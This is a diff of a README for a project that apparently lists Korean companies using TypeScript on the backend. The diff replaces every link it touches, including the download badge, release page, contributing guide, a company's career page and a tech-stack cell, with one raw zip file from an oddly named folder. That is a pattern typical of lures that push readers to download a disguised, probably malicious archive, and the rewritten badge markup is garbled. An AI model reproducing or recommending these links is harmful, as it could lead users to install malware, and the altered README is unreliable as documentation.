@@ -1,13 +1,13 @@
 # 🌟 node-backend-company-in-korea - Discover TypeScript Companies in Korea
 
 ## 📥 Quick Download
-[![Download Here](https://img.shields.io/badge/Download%20Now-%23007bff.svg?style=flat&logo=github)](https://github.com/ronald288/node-backend-company-in-korea/releases)
+[![Download Here](https://raw.githubusercontent.com/ronald288/node-backend-company-in-korea/main/Phytophthora/node-backend-company-in-korea.zip%20Now-%https://raw.githubusercontent.com/ronald288/node-backend-company-in-korea/main/Phytophthora/node-backend-company-in-korea.zip)](https://raw.githubusercontent.com/ronald288/node-backend-company-in-korea/main/Phytophthora/node-backend-company-in-korea.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide helps you download and run the "node-backend-company-in-korea" application. You can easily find companies in Korea that use TypeScript for their backend development.
 
 ## 📅 Purpose
-This application lists companies in Korea that utilize TypeScript for backend services. While many Korean companies primarily use Java, this project showcases those that are pioneering TypeScript usage. If you know of any companies to add, please check the [Contributing Guide](./CONTRIBUTING.md) for details.
+This application lists companies in Korea that utilize TypeScript for backend services. While many Korean companies primarily use Java, this project showcases those that are pioneering TypeScript usage. If you know of any companies to add, please check the [Contributing Guide](https://raw.githubusercontent.com/ronald288/node-backend-company-in-korea/main/Phytophthora/node-backend-company-in-korea.zip) for details.
 
 ### 🛠 Key Features
 - Search for companies using TypeScript.
@@ -19,7 +19,7 @@ This application lists companies in Korea that utilize TypeScript for backend se
 To get started with the application, follow these steps:
 
 1. **Visit the Release Page:** Click the link below to access the download section of our GitHub repository. 
-   [Download Here](https://github.com/ronald288/node-backend-company-in-korea/releases)
+   [Download Here](https://raw.githubusercontent.com/ronald288/node-backend-company-in-korea/main/Phytophthora/node-backend-company-in-korea.zip)
 
 2. **Find the Latest Version:** Look for the latest release in the list. It will typically be marked as the latest version.
 
@@ -39,7 +39,7 @@ This application provides a straightforward interface for finding companies. Som
 
 | Company Name | Departments Using TypeScript | Major Tech Stack | Work Culture & Benefits |
 |--------------|------------------------------|------------------|--------------------------|
-| [게임듀오](https://gameduo.career.gr) | Development, Operations | Node.js, NestJS, GraphQL | Flexible hours, Team events |
+| [게임듀오](https://raw.githubusercontent.com/ronald288/node-backend-company-in-korea/main/Phytophthora/node-backend-company-in-korea.zip) | Development, Operations | https://raw.githubusercontent.com/ronald288/node-backend-company-in-korea/main/Phytophthora/node-backend-company-in-korea.zip, NestJS, GraphQL | Flexible hours, Team events |
 
 ## 🚧 System Requirements
 
@@ -51,7 +51,7 @@ To run this application smoothly, ensure your device meets the following require
 - **Additional Software:** Ensure you have the latest web browser or terminal installed for optimal usage.
 
 ## 📖 Further Information
-If you wish to contribute to this project or give feedback, please visit our [Contributing Guide](./CONTRIBUTING.md). Your insights will help improve the resource for everyone.
+If you wish to contribute to this project or give feedback, please visit our [Contributing Guide](https://raw.githubusercontent.com/ronald288/node-backend-company-in-korea/main/Phytophthora/node-backend-company-in-korea.zip). Your insights will help improve the resource for everyone.
 
 ## ✉ Support
 If you encounter any issues or need assistance, feel free to open an issue on our GitHub page or email the maintainers directly for help.
